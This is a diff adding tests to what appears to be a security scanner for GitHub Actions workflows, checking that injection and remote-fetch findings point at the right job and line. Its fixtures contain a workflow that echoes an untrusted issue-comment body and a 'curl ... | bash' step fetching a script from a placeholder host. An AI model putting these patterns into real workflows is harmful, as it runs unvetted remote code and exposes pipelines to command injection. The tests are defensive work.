@@ -559,3 +559,67 @@ class TestCollector:
         findings, errors = collect_findings(context, [Unevidenced()])
         assert findings == []
         assert any("no evidence" in e for e in errors)
+
+
+class TestFindingLocationsAreExact:
+    """A finding that cites the wrong line sends a reviewer to the wrong code.
+
+    These pin a bug found while preparing a demo: the injection and network
+    rules located a match by searching the whole workflow for its text, which
+    returns the *first* occurrence. Where the same expression or command
+    appeared in two steps, every finding pointed at the first one.
+    """
+
+    DUPLICATE_EXPRESSION = """\
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: ./.github/actions/greet
+        with:
+          who: ${{ github.event.comment.body }}
+  c:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ github.event.comment.body }}"
+"""
+
+    def test_injection_reports_the_step_it_belongs_to(self, tmp_path) -> None:
+        result = scan(tmp_path, self.DUPLICATE_EXPRESSION)
+        findings = only(result.findings, "SCRIPT_INJECTION")
+        assert len(findings) == 1
+
+        finding = findings[0]
+        # The run: in job 'c' at line 14 -- not the `with:` at line 10, which
+        # feeds a local composite action and is a different (unreported) case.
+        assert finding.job == "c"
+        assert finding.line == 14
+        assert "echo" in finding.evidence[0].snippet
+
+    DUPLICATE_COMMAND = """\
+on: push
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -sL https://unknown.test/i.sh | bash
+  b:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo preparing
+          curl -sL https://unknown.test/i.sh | bash
+"""
+
+    def test_network_findings_locate_their_own_step(self, tmp_path) -> None:
+        result = scan(tmp_path, self.DUPLICATE_COMMAND)
+        findings = only(result.findings, "REMOTE_CODE_FETCH")
+        assert len(findings) == 2
+
+        by_job = {f.job: f.line for f in findings}
+        assert by_job["a"] == 6
+        # Inside the block scalar: `run: |` is line 10, so the curl is line 12.
+        assert by_job["b"] == 12
